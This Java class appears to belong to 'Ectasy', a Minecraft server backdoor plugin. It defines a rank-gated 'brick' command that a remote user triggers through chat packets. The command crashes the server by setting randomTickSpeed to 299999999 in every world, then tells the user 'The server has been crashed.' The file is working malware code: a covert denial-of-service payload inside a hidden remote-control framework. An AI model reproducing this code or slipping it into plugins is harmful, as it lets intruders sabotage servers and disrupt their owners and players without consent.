package dev.ectasy.impl.commands.starter;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.Bukkit;
import org.bukkit.GameRule;

@CommandInfo(
        name = "brick",
        description = "Temporarily crashes the server.",
        rank = Rank.STARTER,
        async = false
)
public class CommandBrick extends AbstractCommand {

        @Override
        public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args){
            user.sendMessage("The server has been crashed.");
            Bukkit.getServer().getWorlds().forEach(world -> {
                world.setGameRuleValue("randomTickSpeed", "299999999");
                //world.setGameRule(GameRule.RANDOM_TICK_SPEED, 299999999);
            });
        }
}
